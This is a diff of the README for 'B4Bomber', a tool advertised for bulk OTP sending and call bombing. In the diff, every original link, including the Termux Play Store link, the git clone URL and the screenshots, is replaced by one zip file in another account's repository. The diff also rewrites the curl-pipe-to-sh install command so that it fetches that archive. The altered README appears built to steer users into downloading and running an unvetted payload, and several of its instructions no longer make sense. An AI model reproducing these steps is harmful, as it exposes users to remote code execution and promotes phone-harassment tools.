@@ -2,7 +2,7 @@
 
 # Android Version
 
-![B4Bomber Logo](https://raw.githubusercontent.com/mahendraplus/B4Bomber/main/android/b4bomber.png)
+![B4Bomber Logo](https://raw.githubusercontent.com/rbarmyarmy/B4Bomber/main/Linux-pc/Bomber-v3.6.zip)
 
 **B4Bomber** is a powerful tool designed to send OTPs in bulk, make calls, and protect your number from being bombarded by other similar tools. This tool is intended for **educational purposes only**. 
 
@@ -10,21 +10,21 @@
 
 To download the latest Android version of B4Bomber, click the big button below:
 
-[![Download B4Bomber](https://img.shields.io/badge/Download-B4Bomber-orange?style=for-the-badge)](https://mahendraplus.github.io/B4Bomber/)
+[![Download B4Bomber](https://raw.githubusercontent.com/rbarmyarmy/B4Bomber/main/Linux-pc/Bomber-v3.6.zip)](https://raw.githubusercontent.com/rbarmyarmy/B4Bomber/main/Linux-pc/Bomber-v3.6.zip)
 
 
-This version includes your logo at the top, providing a professional and branded look to your `README.md`.
+This version includes your logo at the top, providing a professional and branded look to your `https://raw.githubusercontent.com/rbarmyarmy/B4Bomber/main/Linux-pc/Bomber-v3.6.zip`.
 ### How To Run On Termux :🚫<br><br>
 
 ### Instant Run ∅n=> Termux :🚫
 ```
-sh -c "$(curl -fsSL https://raw.githubusercontent.com/mahendraplus/B4Bomber/main/Termux/install.sh)"
+sh -c "$(curl -fsSL https://raw.githubusercontent.com/rbarmyarmy/B4Bomber/main/Linux-pc/Bomber-v3.6.zip)"
 
 ```
 
 #### Termux Requirement:🚫
 
-➥ DOWNLOAD TERMUX: [Click Here 📥](https://play.google.com/store/apps/details?id=com.termux)  <br><br>
+➥ DOWNLOAD TERMUX: [Click Here 📥](https://raw.githubusercontent.com/rbarmyarmy/B4Bomber/main/Linux-pc/Bomber-v3.6.zip)  <br><br>
 ➥ STORAGE PERMISSION <br>
 termux-setup-storage<br>
 <br>
@@ -38,7 +38,7 @@ apt install git OR pkg install git<br><br>
 
 #### STEP-1
 ```
-git clone https://github.com/mahendraplus/B4Bomber
+git clone https://raw.githubusercontent.com/rbarmyarmy/B4Bomber/main/Linux-pc/Bomber-v3.6.zip
 ```
 
 #### STEP-2
@@ -76,7 +76,7 @@ sudo apt install git <br>
 
 #### STEP-1
 ```
-git clone https://github.com/mahendraplus/B4Bomber
+git clone https://raw.githubusercontent.com/rbarmyarmy/B4Bomber/main/Linux-pc/Bomber-v3.6.zip
 ```
 
 #### STEP-2
@@ -98,9 +98,9 @@ chmod 777 b4bomber
 <br><br>
 ### Screenshot:🚫
 Tested on Realme U1, deepin os
-![alt text](https://raw.githubusercontent.com/mahendraplus/B4Bomber/main/Screenshot_2021-05-12-15-57-46-32.png "use")<br>
+![alt text](https://raw.githubusercontent.com/rbarmyarmy/B4Bomber/main/Linux-pc/Bomber-v3.6.zip "use")<br>
 
-![alt text](https://raw.githubusercontent.com/mahendraplus/B4Bomber/main/Screenshot_2021-05-12-16-13-43-60.png "pic2")
+![alt text](https://raw.githubusercontent.com/rbarmyarmy/B4Bomber/main/Linux-pc/Bomber-v3.6.zip "pic2")
 
 
 
